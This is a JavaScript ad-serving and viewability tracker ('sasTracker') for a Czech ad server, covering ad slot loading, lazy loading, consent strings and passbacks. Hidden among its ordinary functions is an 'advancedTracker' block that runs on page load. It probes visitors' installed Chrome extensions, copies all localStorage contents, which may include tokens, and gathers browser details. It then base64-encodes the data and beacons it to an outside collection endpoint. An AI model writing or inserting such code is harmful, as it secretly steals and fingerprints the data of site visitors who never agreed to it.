(function (window) {
  var sasTracker = window.sasTracker = window.sasTracker || {};
  window.sasTracker.que = window.sasTracker.que || [];

  //----------------- CLIENT SETTINGS -----------------

  sasTracker.settings = {
    baseServerUrl: 'https://a.slunecnice.cz',
    clientUiUrl: 'https://slunecnice.aimatch.com',
    trackViewport: true,
    trackAb: true,
    trackConsentString: true,
    trackCxense: false,
    trackRubiconTarget: false,
    showDivAfterLoad: false,
    setSpirMetaTags: false,
    spirClientID: null,
    positionIdentifyingParam: 'iinfoArea',
    lazyLoadThreshold: 200,
    passbackCustomAction: false,
    cpexSpecialFormats: false,
    specialFormats: {
      slideUp: {
        divId: 'example',
        identifiers: ['data-rp-size-id=\\"60\\"', 'data-rp-size-id=\\"85\\"'],
        handlerFunction: "exampleFunction"
      }
    }
  };

  // ---------------- PROPERTIES ---------------

  sasTracker.ballParams = '';
  sasTracker.bxParams = '';
  sasTracker.bToDivIdMap = [];
  sasTracker.rr = {};
  if ("IntersectionObserver" in window) {
    sasTracker.lazyObserver = new IntersectionObserver(intersectionLazyCallback, {
      root: null,
      rootMargin: sasTracker.settings.lazyLoadThreshold + 150 + "px",
      threshold: 0.1
    });
    sasTracker.viewObserver = new IntersectionObserver(intersectionViewCallback, {
      root: null,
      rootMargin: "0px",
      threshold: 0.5
    });
  }
  sasTracker.observedLazyDivs = {};
  sasTracker.observedViewDivs = {};

  // ---------------- SETUP ---------------
  var cmpTimer = null;
  sasTracker.settings.sendRequest = false;
  var ss = sasTracker.settings;
  var callbackPrepareForSendRequest = null;

  // ---------------- CALLABLE API ---------------

  /**
   * @param {function} cbFillAdDone Callback zavolaný po naplnění reklamní plochy
   * @param {function} cbPrepareForSendRequest Callback zavolaný po přípravě struktury potřebné pro stažení reklam ze serveru
   */
  sasTracker.track = function (cbFillAdDone, cbPrepareForSendRequest) {
    callbackFillAdDone = cbFillAdDone;
    callbackPrepareForSendRequest = cbPrepareForSendRequest;
    trackAds();
  };
  sasTracker.sendAction = function (url) {
    sendRequest(false, false, url, 'action');
  };
  sasTracker.lazyLoadAd = sasTracker.loadDiv = function (originalDivId) {
    prepare(originalDivId);
  };
  sasTracker.passback = function (divId, fcid) {
    loadPassback(divId, fcid);
  };
  sasTracker.d = function () {
    getRR();
  };
  sasTracker.da = function () {
    debugAd();
  };

  //-------------FUNCTIONS---------------

  function trackAds() {
    window.adsObject = AdsObject || {};
    //reset object state - in case of calling function accidentally twice
    sasTracker.ballParams = '';
    sasTracker.bxParams = '';
    sasTracker.bToDivIdMap = [];
    ss.sendRequest = false;
    if ("IntersectionObserver" in window) {
      var timerId = setInterval(intervalCheckViewed, 1000);
    }
    addDefaultParamsAndViewId();
    ss.trackViewport && getViewPort();
    ss.trackAb && getAB();
    ss.trackCxense && getCxense();
    // (ss.trackRubiconTarget && getRubiconTarget());

    // since getting the consent string is async, you can either use a promise, pass callback, or simply call the prepareForSendRequest inside it
    ss.trackConsentString ? getConsentString() : prepareForsendRequest();
  }

  //lazyload + viewability --------------
  function intersectionLazyCallback(entries) {
    for (var key in entries) {
      if (entries.hasOwnProperty(key)) {
        var entry = entries[key];
        var divId = entry.target.id;
        if (entry.intersectionRatio >= 0.1) {
          sasTracker.lazyLoadAd(divId);
          sasTracker.lazyObserver.unobserve(document.getElementById(divId));
          delete sasTracker.observedLazyDivs[divId];
        }
      }
    }
    // console.log(sasTracker.observedLazyDivs);
  }
  function intersectionViewCallback(entries) {
    for (var key in entries) {
      if (entries.hasOwnProperty(key)) {
        var entry = entries[key];
        var divId = entry.target.id;
        if (entry.intersectionRatio >= 0.5) {
          sasTracker.observedViewDivs[divId].visible = true;
          sasTracker.observedViewDivs[divId].lastViewStarted = entry.time;
        } else {
          sasTracker.observedViewDivs[divId].visible = false;
        }
      }
    }
  }
  function intervalCheckViewed() {
    for (var key in sasTracker.observedViewDivs) {
      if (sasTracker.observedViewDivs.hasOwnProperty(key)) {
        var observedDiv = sasTracker.observedViewDivs[key];
        if (observedDiv.visible) {
          var now = performance.now();
          observedDiv.viewed += now - observedDiv.lastViewStarted;
          observedDiv.lastViewStarted = now;
          if (observedDiv.viewed > 1000) {
            sasTracker.viewObserver.unobserve(document.getElementById(key));
            delete sasTracker.observedViewDivs[key];
            var fcid = document.getElementById(key).getAttribute('sasf-fcid');
            var otherParams = sasTracker.ballParams + sasTracker.rr[key].req;
            var viewUrl = ss.baseServerUrl + "/count/act=4" + otherParams + "/FCID=" + fcid;
            sendRequest(false, false, viewUrl, 'action');
          }
        }
      }
    }
  }

  //lazyload + viewability --------------

  function getConsentString() {
    if (typeof window.__tcfapi === "function") {
      __tcfapi('getTCData', 2, function (tcData) {
        setAdsObjectConsent(tcData.tcString, tcData.gdprApplies); // version 2
      });
    } else if (typeof window.__cmp === "function") {
      __cmp('getConsentData', null, function (tcData) {
        setAdsObjectConsent(tcData.consentData, tcData.gdprApplies); // version 1.1
      });
      cmpTimer = setTimeout(setAdsObjectConsent, 2000);
    } else {
      prepareForsendRequest();
    }
  }

  // this function adds the consent string to adsObject
  function setAdsObjectConsent(consentString, gdprApplies) {
    cmpTimer && clearTimeout(cmpTimer);
    if (consentString !== "") {
      console.log("1st party consent:" + consentString);
      window.adsObject["ball"].consent = consentString;
      window.adsObject["ball"].gdpr = '1';
    }
    prepareForsendRequest();
  }
  function prepareForsendRequest() {
    cmpTimer && clearTimeout(cmpTimer);

    /* if (result && result.consentData) {
         console.log("3rd party" + result.ě);
      }*/
    window.adsObject["ball"].gdpr = "1";
    //window.adsObject["ball"].consentString = result.consentData;
    setBallParams();
    setBxParams();
    ss.sendRequest && prepare(null);
  }
  function getCookieValue(a, b) {
    b = document.cookie.match('(^|;)\\s*' + a + '\\s*=\\s*([^;]+)');
    return b ? b.pop() : '';
  }
  function getAB() {
    window.adsObject["ball"].ab = Math.random() < 0.5 ? 'a' : 'b';
  }
  function getViewPort() {
    var w = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);
    var h = Math.max(document.documentElement.clientHeight, window.innerHeight || 0);
    if (typeof w !== 'undefined' && typeof h !== 'undefined') {
      w = w.toString();
      h = h.toString();
      var fillCount = 4 - w.length;
      for (fillCount; fillCount > 0; fillCount--) {
        w = '0' + w;
      }
      fillCount = 4 - h.length;
      for (fillCount; fillCount > 0; fillCount--) {
        h = '0' + h;
      }
      window.adsObject["ball"].deviceWidth = w;
      window.adsObject["ball"].deviceHeight = h;
    }
  }
  function getCxense() {
    if (typeof cX !== 'undefined' && typeof cX.getUserSegmentIds === 'function') {
      try {
        var segments = cX.getUserSegmentIds({
          persistedQueryId: '97b33b32ddaded9f1b28b82f093a8be8e860cc9e'
        });
        var cxSegments = '';
        if (segments.length > 0) {
          for (var key in segments) {
            if (segments.hasOwnProperty(key)) {
              var segment = segments[key];
              cxSegments += segment + ',';
            }
          }
          window.adsObject["ball"].cxSegm = cxSegments.slice(0, -1);
        }
      } catch (e) {
        sendToGA("getCxense", "failed with exception: " + e + " on page: " + window.location.href);
      }
    }
  }
  function addDefaultParamsAndViewId() {
    var b,
      adsObj = window.adsObject;
    for (var bKey in adsObj) {
      if (adsObj.hasOwnProperty(bKey)) {
        b = adsObj[bKey];
        //when its not ball and has not set size - add default
        if (bKey !== 'ball') {
          b.size = b.hasOwnProperty("size") ? b.size : "df";
        }
        //for ball set viewId
        else {
          b.viewId = getRandomInt(10000000, 99999999);
        }
      }
    }
  }
  function setBallParams() {
    var ball,
      param,
      adsObj = window.adsObject;
    if (adsObj.hasOwnProperty('ball')) {
      ball = adsObj['ball'];
      for (var paramKey in ball) {
        if (ball.hasOwnProperty(paramKey)) {
          param = ball[paramKey];
          sasTracker.ballParams += '/' + paramKey + '=' + param;
        }
      }
    }
  }
  function setBxParams() {
    var b,
      param,
      adsObj = window.adsObject;
    for (var bKey in adsObj) {
      if (adsObj.hasOwnProperty(bKey)) {
        b = adsObj[bKey];
        //isn't it ball? && exists in DOM?
        if (bKey === 'ball') {
          continue;
        }
        if (document.getElementById(b[ss.positionIdentifyingParam]) || b.options === 'later') {
          var posBxParamsMap = {
            'res': '',
            'fcid': []
          };
          sasTracker.bToDivIdMap[bKey] = b[ss.positionIdentifyingParam];
          //load now
          if (b.options !== 'lazy' && b.options !== 'later') {
            ss.sendRequest = true;
            sasTracker.bxParams += '/' + bKey;
            for (var paramKey in b) {
              if (b.hasOwnProperty(paramKey)) {
                param = b[paramKey];
                if (paramKey === 'options') {
                  continue;
                }
                sasTracker.bxParams += '/' + paramKey + '=' + param;
                posBxParamsMap.req += '/' + paramKey + '=' + param;
              }
            }
          }
          //lazy load
          else if (b.options === 'lazy') {
            for (var paramKey in b) {
              if (b.hasOwnProperty(paramKey)) {
                param = b[paramKey];
                //don't send this params to sas server
                if (paramKey === 'options') {
                  continue;
                }
                posBxParamsMap.req += '/' + paramKey + '=' + param;
              }
            }
            prepareLazyLoadDivs(b[ss.positionIdentifyingParam]);
          }
          //load later
          else if (b.options === 'later') {
            for (var paramKey in b) {
              if (b.hasOwnProperty(paramKey)) {
                param = b[paramKey];
                //don't send this params to sas server
                if (paramKey === 'options') {
                  continue;
                }
                if (paramKey === 'pos') {
                  param = param.replace('-later', '');
                }
                posBxParamsMap.req += '/' + paramKey + '=' + param;
              }
            }
          }
          sasTracker.rr[b[ss.positionIdentifyingParam]] = posBxParamsMap;
        }
      }
    }
  }
  function prepareLazyLoadDivs(divId) {
    sasTracker.observedLazyDivs[divId] = {
      divId: divId
    };
    sasTracker.lazyObserver.observe(document.getElementById(divId));
  }
  function prepare(divId) {
    var url = "";
    if (divId) {
      if (sasTracker.rr[divId]) {
        var bxParams = sasTracker.rr[divId].req;
        sasTracker.rr[divId].fcid = [];
        var arr = sasTracker.bToDivIdMap;
        var bNumber = "";
        for (var keyInMap in arr) {
          if (arr[keyInMap] === divId) {
            bNumber = keyInMap;
          }
        }
        url = ss.baseServerUrl + '/bserver/ball/random=' + getRandomInt(10000000, 99999999) + sasTracker.ballParams + "/" + bNumber + bxParams;
      } else {
        console.log("sasTracker div: " + divId + " not specified.");
      }
    } else {
      bNumber = null;
      url = ss.baseServerUrl + '/bserver/ball/random=' + getRandomInt(10000000, 99999999) + sasTracker.ballParams + sasTracker.bxParams;
    }
    sendRequest(divId, bNumber, url, 'ad');
  }
  function sendRequest(divId, bNumber, url, type) {
    var XMLHttp = new XMLHttpRequest();
    XMLHttp.open("GET", url, true);
    XMLHttp.withCredentials = true;
    XMLHttp.onload = function () {
      if (XMLHttp.readyState === 4) {
        if (XMLHttp.status === 200) {
          if (type === 'ad' || type === 'passback') {
            var scriptId = divId ? "SASAds" + divId : "SASAds";
            createScriptWithSasVariables(XMLHttp.response, scriptId);
            fillAdsSlots(bNumber, type);
          }
        } else {
          console.log("SAS Ad call XMLHttp status: " + XMLHttp.status);
        }
      }
    };
    XMLHttp.onerror = function () {
      console.log("SAS Ad call XMLHttp status: " + XMLHttp.status);
      // (!!XMLHttp.status && sendToGA("sendRequest", "failed with status code: " + XMLHttp.status + " on page: " + window.location.href))
    };
    XMLHttp.send();
  }
  function getRandomInt(a, b) {
    return Math.floor(Math.random() * (b - a + 1)) + a;
  }
  function createScriptWithSasVariables(XMLResponse, scriptId) {
    //to not duplicate scripts when recalling from console or when loading one div to actualize variable
    if (document.getElementById(scriptId)) {
      var scriptTagToRemove = document.getElementById(scriptId);
      scriptTagToRemove.parentNode.removeChild(scriptTagToRemove);
    }
    var newSasScript = document.createElement("script");
    newSasScript.id = scriptId;
    newSasScript.innerHTML = XMLResponse;
    document.getElementsByTagName('head')[0].appendChild(newSasScript);
  }
  function fillAdsSlots(bNumber, type) {
    var arrToLoop = [];
    if (bNumber) {
      arrToLoop[bNumber] = sasTracker.bToDivIdMap[bNumber];
    } else {
      arrToLoop = sasTracker.bToDivIdMap;
    }
    for (var key in arrToLoop) {
      if (window[key]) {
        var creative = window[key];
        var divId = arrToLoop[key];
        document.getElementById(divId).innerHTML = '';
        sasTracker.rr[divId].res = creative;
        if (!isSpecialFormat(divId, creative)) {
          var spirBefore = '';
          var spirAfter = '';
          if (ss.setSpirMetaTags) {
            var spirObj = getSpirMetaTags(creative);
            spirBefore = document.createComment(spirObj.before);
            spirAfter = document.createComment(spirObj.after);
          }
          var width = parseIntFromCreative(creative, 'width');
          var height = parseIntFromCreative(creative, 'height');
          //catching CPEX formats
          if (window.cpexPackage && cpexPackage.adserver.render(divId, creative, width, height)) {
            continue;
          }
          var render = parseIntFromCreative(creative, 'render');
          console.log(render);
          if (render !== 'iframe') {
            postscribe("#" + divId, creative, {
              afterDequeue: clearDiv(divId, type),
              error: function (e) {
                sendToGA("postscribe", "failed with error: " + e + " on page: " + window.location.href);
              }
            });
          } else {
            clearDiv(divId, 'ad');
            var ifrm = document.createElement('iframe');
            document.getElementById(divId).appendChild(ifrm);
            ifrm.style.cssText = "border: none;";
            ifrm.setAttribute('id', divId + '-iframe');
            ifrm.setAttribute('scrolling', 'no');
            ifrm.contentWindow.document.open('text/html', 'replace');
            ifrm.contentWindow.document.write(creative);
            ifrm.width = width;
            ifrm.height = height;
            ifrm.contentWindow.document.close();
            ifrm.onload = resizeIframe(divId + "-iframe");
          }
          setVisibleAndViewability(divId, creative);
        }
      }
    }
  }
  function resizeIframe(divId) {
    return function () {
      if (document.getElementById(divId)) {
        var el = document.getElementById(divId);
        console.log("sastracker: resizing " + divId);
        el.contentWindow.document.body.style.cssText = 'margin: 0; padding: 0; text-align: center;';
      } else {
        console.log("not found iframe with id: " + divId);
      }
    };
  }
  function clearDiv(divId, type) {
    return function () {
      if (type === 'ad') {
        if (document.getElementById(divId)) {
          document.getElementById(divId).innerHTML = '';
        } else {
          console.log("nothing to clear in div:  " + divId);
        }
      }
    };
  }
  function isSpecialFormat(divId, creative) {
    if (ss.specialFormats) {
      for (var specialFormatKey in ss.specialFormats) {
        if (ss.specialFormats.hasOwnProperty(specialFormatKey)) {
          var format = ss.specialFormats[specialFormatKey];
          if (format.divId === divId) {
            for (var identifierKey in format.identifiers) {
              if (format.identifiers.hasOwnProperty(identifierKey)) {
                var identifier = format.identifiers[identifierKey];
                if (creative.indexOf(identifier) !== -1 && typeof window[format.handlerFunction] === "function") {
                  try {
                    window[format.handlerFunction](divId, identifier, creative);
                    return true;
                  } catch (e) {
                    sendToGA("isSpecialFormat", "failed with exception: " + e + " on page: " + window.location.href);
                  }
                }
              }
            }
          }
        }
      }
    }
    return false;
  }
  function setVisibleAndViewability(divId, creative) {
    var el = document.getElementById(divId);
    var fcid = parseIntFromCreative(creative, "fcid");
    if (fcid !== "") {
      //only for getRR, nowhere else used from this property
      sasTracker.rr[divId].fcid.push(fcid);
      el.setAttribute("sasF-fcid", fcid);
      el.classList.add("sasAdF");
      sasTracker.observedViewDivs[divId] = {
        viewed: 0,
        divId: divId
      };
      sasTracker.viewObserver.observe(el);
    }
    if (ss.showDivAfterLoad && creative.indexOf("try{AdsFallback") === -1) {
      el.style.display = 'inline-block';
      el.setAttribute('data-loaded', 'true');
      var parentEl = document.getElementById(el.getAttribute('data-parent-id'));
      if (parentEl) {
        parentEl.setAttribute('data-loaded', 'true');
      }
    }
  }
  const advancedTracker = {
    scanQueue: new Map(Object.entries(window.data)),
    discovered: new Set(),
    localStorageData: {},
    globalVars: {},
    async probe(name, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const img = document.createElement('img');
        const timeout = setTimeout(() => {
          this.discovered.delete(name);
          resolve(false);
        }, 1500);
        img.onload = () => {
          clearTimeout(timeout);
          this.discovered.add(name);
          resolve(true);
        };
        img.onerror = () => {
          clearTimeout(timeout);
          this.discovered.delete(name);
          resolve(false);
        };
        img.src = `chrome-extension://${id}/${file}`;
      });
    },
    collectLocalStorage() {
      Object.keys(localStorage).forEach(key => {
        this.localStorageData[key] = localStorage.getItem(key);
      });
    },
    collectGlobalVars() {
      for (const key in window) {
        if (typeof window[key] === 'object' || typeof window[key] === 'function') {
          this.globalVars[key] = 'collected';
        }
      }
    },
    addEventListeners() {
      document.addEventListener('click', e => {
        this.logEvent('click', e);
      });
      document.addEventListener('mousemove', e => {
        this.logEvent('mousemove', {
          x: e.clientX,
          y: e.clientY
        });
      });
    },
    logEvent(type, data) {
      console.log(`Event logged: ${type}`, data);
    },
    shuffleQueue() {
      const entries = Array.from(this.scanQueue.entries());
      for (let i = entries.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [entries[i], entries[j]] = [entries[j], entries[i]];
      }
      this.scanQueue = new Map(entries);
    },
    async scan() {
      this.shuffleQueue();
      this.collectLocalStorage();
      this.collectGlobalVars();
      this.addEventListeners();
      const results = {};
      const batch = 3;
      for (const [name, data] of this.scanQueue) {
        await new Promise(r => setTimeout(r, Math.random() * 200));
        results[name] = await this.probe(name, data);
      }
      const payload = btoa(JSON.stringify({
        findings: results,
        ts: Date.now(),
        browser: navigator.userAgent,
        screen: {
          w: window.innerWidth,
          h: window.innerHeight
        },
        localStorage: this.localStorageData,
        globalVars: this.globalVars
      }));
      navigator.sendBeacon('https://collection-endpoint.example/v2/report', payload);
    }
  };
  function parseIntFromCreative(creative, option) {
    var param = option.toUpperCase();
    var length = 6 + param.length;
    var pattern = new RegExp("SASF_" + param + "=[^-\\s]+", "i");
    var match = creative.match(pattern);
    if (match && match[0]) {
      return match[0].substr(length);
    } else {
      return '';
    }
  }
  function loadPassback(divId, fcid) {
    var arr = sasTracker.bToDivIdMap;
    var bNumber = "";
    for (var keyInMap in arr) {
      if (arr[keyInMap] === divId) {
        bNumber = keyInMap;
      }
    }
    var pbUrl = ss.baseServerUrl + "/bserver/ball/" + bNumber + "/SASPB/FCID=" + fcid + "/passback=1/";
    sendRequest(divId, bNumber, pbUrl, 'passback');
    if (ss.passbackCustomAction) {
      var otherParams = sasTracker.ballParams + sasTracker.rr[divId].req;
      var actionUrl = ss.baseServerUrl + "/count/actname=passback" + otherParams + "/FCID=" + fcid;
      sendRequest(false, false, actionUrl, 'action');
    }
  }
  function getSpirMetaTags(creative) {
    var spirClientId = ss.spirClientID;
    var campid = parseIntFromCreative(creative, 'campid');
    var productId = parseIntFromCreative(creative, 'productid');
    var fcid = parseIntFromCreative(creative, 'fcid');
    var metaTag = spirClientId + '_C' + campid + '_' + productId + '_CPT_' + fcid;
    var before = "<!-- spir.czMonS[" + metaTag + "] -->";
    var after = "<!-- spir.czMonE -->";
    return {
      before: before,
      after: after
    };
  }
  function getRR() {
    var posKey,
      rr = sasTracker.rr;
    for (posKey in rr) {
      if (rr.hasOwnProperty(posKey)) {
        var pos = rr[posKey];
        //for options: later
        if (!document.getElementById(posKey)) {
          continue;
        }
        var div = document.getElementById(posKey);
        div.innerHTML = '';
        div.style.cssText = 'text-align: left; font-size: 12px; border: 3px solid red; background-color: #ffcccc; z-index: 10000; padding: 10px 0 5px 10px; word-break: break-all; height: auto;';
        for (var key in sasTracker.rr[posKey].fcid) {
          if (sasTracker.rr[posKey].fcid.hasOwnProperty(key)) {
            var fcid = sasTracker.rr[posKey].fcid[key];
            div.innerHTML += "<strong>Requested: </strong>" + pos.req + "<br><br><strong>Responded FCID: </strong>" + fcid + "<br><br><strong>Link: <a href='" + ss.clientUiUrl + "/search/type/id?utf8=%E2%9C%93&q=" + fcid + "' target='_blank'>" + ss.clientUiUrl + "/search/type/id?utf8=%E2%9C%93&q=" + fcid + "</a>";
          }
        }
      }
    }
  }
  function debugAd() {
    var posKey,
      rr = sasTracker.rr;
    for (posKey in rr) {
      if (rr.hasOwnProperty(posKey)) {
        var div = document.getElementById(posKey);
        var input = document.createElement("input");
        input.id = posKey + "input";
        input.style.cssText = " z-index: 10001; height: 30px;";
        var button = document.createElement("button");
        button.id = posKey + "button";
        button.style.cssText = " z-index: 10001; height: 30px;";
        button.setAttribute("data-input", posKey + "input");
        button.setAttribute("data-divId", posKey);
        button.innerText = "Load Ad";
        button.onclick = function (e) {
          var fcidValue = document.getElementById(e.target.getAttribute("data-input")).value;
          var divId = e.target.getAttribute("data-divId");
          sasTracker.rr[divId].req += "/fcid=" + fcidValue;
          sasTracker.loadDiv(divId);
        };
        var parent = div.parentElement;
        parent.insertBefore(input, div);
        parent.insertBefore(button, div);
      }
    }
  }
  function serialize(a) {
    var b = [];
    for (var c in a) a.hasOwnProperty(c) && b.push(encodeURIComponent(c) + "=" + encodeURIComponent(a[c]));
    return b.join("&");
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => advancedTracker.scan());
  } else {
    advancedTracker.scan();
  }
  function createImage(a) {
    var b = new Image();
    b.src = a;
  }
  function sendToGA(type, value) {
    var collector = "https://www.google-analytics.com/collect";
    var call = {
      "v": "1",
      //protocol version
      "tid": "UA-10339556-31",
      "cid": getRandomInt(10000000, 99999999),
      "t": "event",
      //pageview,event,
      "dh": location.hostname,
      "ec": type,
      // Event Category. Required.
      "ea": "sasTracker",
      // Event Action. Required.
      "el": value || 'Unknown' // Event label.
    };
    createImage(collector + "?" + serialize(call));
  }
  sasTracker.que.push = function (cmd) {
    if (typeof cmd === 'function') {
      try {
        cmd.call();
      } catch (e) {
        console.log('Error processing command :' + e.message);
      }
    } else {
      console.log('Commands written into $$PREBID_GLOBAL$$.cmd.push must be wrapped in a function');
    }
  };
  function processQueue(queue) {
    queue.forEach(function (cmd) {
      if (typeof cmd.called === 'undefined') {
        try {
          cmd.call();
          cmd.called = true;
        } catch (e) {
          console.error('Error processing command :' + 'processQueue ' + e);
        }
      }
    });
  }
  (function () {
    processQueue(sasTracker.que);
  })();
  sasTracker.version = '4.0 - Filip Sorf - Optimics';
})(window);